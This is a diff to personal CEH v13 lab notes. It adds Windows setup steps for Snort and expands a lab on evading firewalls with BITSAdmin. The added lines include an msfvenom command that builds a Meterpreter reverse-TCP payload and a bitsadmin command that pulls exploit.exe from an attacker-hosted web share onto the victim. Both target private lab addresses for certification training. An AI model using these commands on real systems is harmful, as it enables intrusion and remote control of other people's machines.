@@ -7,8 +7,17 @@ be it attacking the target or getting info about the target that is behind the f
 ### detect intrusion
 
 tool used
-#### [[Snort]]
-refer to the booklet for better explanation
+#### [[Snort]] [[windows]]
+
+1. Install snort exe on the windows machine and Snort requires WinPcap to be installed on your machine.
+2. Snort installs itself in C:\Snort
+3. Navigate to the **etc folder** in the specified location, E:\CEH-Tools\CEHv13 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150\etc of the Snort rules; **copy snort.conf and paste it in C:\Snort\etc**.
+4. Snort.conf is already present in C:\Snort\etc; replace the file with the newly copied file.
+5. Copy the **so_rules,rules,preprocs_rules** folder from E:\CEH-Tools\CEHv13 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150 and paste into C:\Snort.
+6. Open Command Prompt window ; type cd C:\Snort\bin and press Enter to access the bin folder in the command prompt. Run snort command to initiate snort.
+7. Snort initializes; wait for it to complete. Press Ctrl+C after some time, Snort exits and comes back to C:\Snort\bin.
+8. Now type **snort -W**. This command lists your machine’s physical address, IP address, and Ethernet Drivers, but all are disabled by default.
+
 
 ### deploying honeypot
 
@@ -126,7 +135,7 @@ to open putty
 ## Evade IDS/[[Firewall]]
 
 tool used
-#### [[BITSAdmin]]
+#### [[BITSAdmin]] [[windows]]
 
 in this lab we are simulating that we have already hacked the machine
 and we need to transfer a file into the machine
@@ -134,12 +143,11 @@ but in normal case the file will eb detected by the firewall and won't be allowe
 so instead of sending something inside, we go inside and ask for something to be delivered inside
 hence the request will generate from the inside so it is less likely to be stopped by the firewall
 
-
-```PowerShell
-bitsadmin /transfer exploit.exe http://10.10.1.12/share/exploit.exe c:\exploit.exe
-```
-
 but to implement this command first we need to have our `exploit.exe` in the right place
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp lport=4444 lhost=10.10.1.13 -f exe -O Exploit.exe
+```
 
 ```bash
 mkdir /var/www/html/share
@@ -153,6 +161,15 @@ chown -R www-data:www-data /var/www/html/share
 ```bash
 service apache2 start
 ```
+
+In Victim windows machine:
+
+Turn on windows defender firewall and then do follow below cmd:
+
+```PowerShell
+bitsadmin /transfer exploit.exe http://10.10.1.12/share/exploit.exe c:\exploit.exe
+```
+
 
 this will create a file that is accessible via requests
 we need to place our `exploit.exe` inside this share 
